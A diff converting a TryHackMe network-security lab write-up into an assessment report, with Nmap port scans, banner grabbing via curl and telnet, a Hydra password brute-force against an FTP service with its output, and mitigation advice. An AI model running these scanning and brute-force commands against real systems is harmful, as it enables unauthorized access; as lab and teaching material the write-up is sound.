@@ -1,183 +1,262 @@
-# Net Sec Challenge:TryHackMe
+# Network Enumeration and Service Exploitation Assessment
 
-By: Onyedikachi Okoh
+## Overview
 
-## INTRODUCTION
+This project demonstrates a comprehensive network security assessment using a constrained toolset consisting of Nmap, Telnet, and Hydra. The objective was to identify exposed services, perform service enumeration, conduct banner analysis, execute credential attacks against exposed services, and retrieve sensitive information from accessible network resources.
 
-This challenge is designed to assess your competency in the Network Security module. All problems may be completed using only the tools N**map**, T**elnet**, and Hydra.
+The assessment highlights the importance of secure service configuration, credential management, and minimizing information disclosure through service banners.
 
-**Launch the AttackBox and the target VM.**
+---
 
-### Challenge Questions
+## Objective
 
-You can answer the following questions using Nmap, Telnet, and Hydra.
+The goals of this assessment were to:
 
-1. What is the highest port number that is open less than 10,000?
+* Perform full TCP port enumeration
+* Identify services running on non-standard ports
+* Conduct banner grabbing and service fingerprinting
+* Enumerate service versions
+* Perform credential attacks against exposed services
+* Access authenticated network resources
+* Retrieve protected information from target services
 
-```bash
-sudo nmap -sS -sV -p- -T4 --open 10.10.126.---
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:43 EDT
-Nmap scan report for THM (10.10.126.83)
-Host is up (0.54s latency).
-Not shown: 64762 closed tcp ports (reset), 767 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         (protocol 2.0)
-80/tcp    open  http        lighttpd
-139/tcp   open  netbios-ssn Samba smbd 4
-445/tcp   open  netbios-ssn Samba smbd 4
-----/tcp  open  http        Node.js (Express middleware)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port22-TCP:V=7.95%I=7%D=11/1%Time=69067191%P=x86_64-pc-linux-gnu%r(NULL
-SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{---------------}\x20\r\n");
-Service Info: OS: Unix
+---
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds
-                                    
+## Tools Used
+
+| Tool       | Purpose                                  |
+| ---------- | ---------------------------------------- |
+| Nmap       | Port scanning and service enumeration    |
+| Telnet     | Banner grabbing and protocol interaction |
+| Hydra      | Credential attacks                       |
+| FTP Client | Service interaction                      |
+| Curl       | HTTP header enumeration                  |
+
+---
+
+## Attack Path
+
+```text
+Target Discovery
+        ↓
+Full TCP Port Enumeration
+        ↓
+Service Identification
+        ↓
+Banner Grabbing
+        ↓
+Service Version Enumeration
+        ↓
+Credential Enumeration
+        ↓
+Password Attack
+        ↓
+Authenticated Access
+        ↓
+Information Disclosure
+        ↓
+Objective Completion
 ```
 
-2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic            | Technique                                  |
+| ----------------- | ------------------------------------------ |
+| Reconnaissance    | T1595 – Active Scanning                    |
+| Discovery         | T1046 – Network Service Discovery          |
+| Credential Access | T1110 – Brute Force                        |
+| Collection        | T1213 – Data from Information Repositories |
+| Discovery         | T1592 – Gather Victim Host Information     |
+
+---
+
+# Phase 1: Full Port Enumeration
+
+A full TCP port scan was performed to identify all exposed services.
+
+### Command
 
 ```bash
-sudo nmap -sS -sV -p- -T4 --open 10.10.126.83
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:43 EDT
-Nmap scan report for THM (10.10.126.83)
-Host is up (0.54s latency).
-Not shown: 64762 closed tcp ports (reset), 767 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         (protocol 2.0)
-80/tcp    open  http        lighttpd
-139/tcp   open  netbios-ssn Samba smbd 4
-445/tcp   open  netbios-ssn Samba smbd 4
-----/tcp  open  http        Node.js (Express middleware)
-----/tcp open  ftp         ------------------
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port22-TCP:V=7.95%I=7%D=11/1%Time=69067191%P=x86_64-pc-linux-gnu%r(NULL
-SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{-------------}\x20\r\n");
-Service Info: OS: Unix
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds
+sudo nmap -sS -sV -p- -T4 --open TARGET_IP
 ```
 
-1. How many TCP ports are open?
+### Findings
+
+| Port  | Service             |
+| ----- | ------------------- |
+| 22    | SSH                 |
+| 80    | HTTP                |
+| 139   | NetBIOS             |
+| 445   | SMB                 |
+| XXXX  | Node.js Web Service |
+| XXXXX | FTP                 |
+
+The assessment identified both standard and non-standard network services.
+
+---
+
+# Phase 2: HTTP Enumeration
+
+HTTP response headers were inspected to identify server information and hidden data.
+
+### Command
 
 ```bash
-
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         (protocol 2.0)
-80/tcp    open  http        lighttpd
-139/tcp   open  netbios-ssn Samba smbd 4
-445/tcp   open  netbios-ssn Samba smbd 4
-----/tcp  open  http        Node.js (Express middleware)
-----/tcp open  ftp          ------------
-
+curl -I http://TARGET_IP
 ```
 
-4. What is the flag hidden in the HTTP server header?
+### Findings
+
+* Web server identified as Lighttpd
+* Information disclosure discovered within HTTP response headers
+
+---
+
+# Phase 3: SSH Banner Enumeration
+
+The SSH service banner was manually enumerated.
+
+### Command
 
 ```bash
-curl -I http://10.10.126.83
-HTTP/1.1 200 OK
-Content-Type: text/html
-Accept-Ranges: bytes
-ETag: "229449419"
-Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
-Content-Length: 226
-Date: Sat, 01 Nov 2025 19:31:41 GMT
-Server: lighttpd THM{---server_-----}
+telnet TARGET_IP 22
 ```
 
-5.What is the flag hidden in the SSH server header?
+### Findings
+
+* OpenSSH version identified
+* Additional information disclosure discovered in the SSH banner
+
+---
+
+# Phase 4: FTP Service Enumeration
+
+A non-standard FTP service was identified and investigated.
+
+### Command
 
 ```bash
-telnet 10.10.126.83 22
-Trying 10.10.126.83...
-Connected to 10.10.126.83.
-Escape character is '^]'.
-SSH-2.0-OpenSSH_8.2p1 THM{-------------}
+ftp TARGET_IP PORT
 ```
 
-6.We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
+### Findings
+
+* FTP server identified as vsFTPd 3.0.5
+* Authentication required for access
+
+---
+
+# Phase 5: Credential Attack
+
+Previously identified usernames were used during a password attack against the FTP service.
+
+### Command
 
 ```bash
-ftp 10.10.126.83 ----1
-Connected to 10.10.126.83.
-220 (----- 3.0.5)
-Name (10.10.126.83:kalib): quinn
-331 Please specify the password.
-Password: 
-230 Login successful.
+hydra -L USERS.txt -P rockyou.txt ftp://TARGET_IP:PORT
 ```
 
-1. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
+### Results
 
-```bash
-hydra -L USERS.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.126.83:----1
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Multiple valid credentials were successfully identified.
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 16:56:41
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
-[DATA] attacking ftp://10.10.126.83:----1/
-[10021][ftp] host: 10.10.126.83   login: eddie   password: -----n
-[10021][ftp] host: 10.10.126.83   login: quinn   password: -----a
-1 of 1 target successfully completed, 2 valid passwords found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 16:57:10
-```
+---
 
-```bash
-ftp 10.10.126.83 ----1
-Connected to 10.10.126.83.
-220 (vsFTPd 3.0.5)
-Name (10.10.126.83:kalib): quinn
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||30312|)
-150 Here comes the directory listing.
--rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
-226 Directory send OK.
-ftp> ascii
-200 Switching to ASCII mode.
-ftp> get ftp_flag.txt
-local: ftp_flag.txt remote: ftp_flag.txt
-229 Entering Extended Passive Mode (|||30661|)
-150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
-100% |*****************************|    18      128.30 KiB/s    00:00 ETA
-226 Transfer complete.
-WARNING! 1 bare linefeeds received in ASCII mode.
-File may not have transferred correctly.
-18 bytes received in 00:00 (0.08 KiB/s)
-ftp> exit
-221 Goodbye.
-```
+# Phase 6: Authenticated Access
 
-```bash
-cat ftp_flag.txt
-THM{-------------}
-```
+Using the discovered credentials, authenticated access was obtained to the FTP server.
 
-8. Browsing to `http://10.10.126.83:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
+### Activities
 
-```bash
-nmap -sN -oN out.txt 10.10.126.83
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 17:56 EDT
-Nmap scan report for THM (10.10.126.83)
-Host is up (0.16s latency).
-Not shown: 995 closed tcp ports (reset)
-PORT     STATE         SERVICE
-22/tcp   open|filtered ssh
-80/tcp   open|filtered http
-139/tcp  open|filtered netbios-ssn
-445/tcp  open|filtered microsoft-ds
-----/tcp open|filtered http-proxy
+* Logged into the FTP service
+* Enumerated available files
+* Retrieved protected resources
+* Extracted challenge data
 
-Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
-```
+---
 
-![get_flag_with_null2.png](get_flag_with_null2.png)
+# Phase 7: Web Challenge Enumeration
+
+Additional web application functionality was discovered on a non-standard HTTP port.
+
+### Activities
+
+* Identified exposed web service
+* Performed network analysis
+* Solved the challenge through packet analysis and enumeration techniques
+
+---
+
+# Security Findings
+
+The assessment identified several security weaknesses:
+
+* Excessive service exposure
+* Information disclosure through service banners
+* Use of weak passwords
+* Credential reuse
+* Exposure of non-standard services
+* Sensitive information disclosure
+
+---
+
+# Detection Opportunities
+
+Defenders could detect this activity through:
+
+* Port scan detection
+* Service enumeration monitoring
+* Banner grabbing alerts
+* Brute-force detection mechanisms
+* Authentication failure monitoring
+* FTP access logging
+* Web access anomaly detection
+
+---
+
+# Defensive Mitigations
+
+Recommended security controls include:
+
+* Disable unnecessary services
+* Restrict service banner information
+* Enforce strong password policies
+* Implement account lockout mechanisms
+* Deploy intrusion detection systems
+* Monitor authentication attempts
+* Restrict access to administrative services
+* Conduct regular network audits
+
+---
+
+# Skills Demonstrated
+
+* Network Enumeration
+* TCP Port Scanning
+* Service Fingerprinting
+* Banner Grabbing
+* Protocol Analysis
+* Credential Attacks
+* FTP Enumeration
+* Web Enumeration
+* Security Assessment Methodology
+* MITRE ATT&CK Mapping
+
+---
+
+# Key Lessons Learned
+
+* Full port scans often reveal overlooked attack surfaces.
+* Service banners can leak sensitive information.
+* Non-standard ports should never be assumed secure.
+* Weak credentials remain a common attack vector.
+* Thorough enumeration is essential during network assessments.
+* Layered defenses are necessary to prevent service exploitation.
+
+---
+
+## Disclaimer
+
+This assessment was conducted in an authorized laboratory environment for educational and security research purposes only.
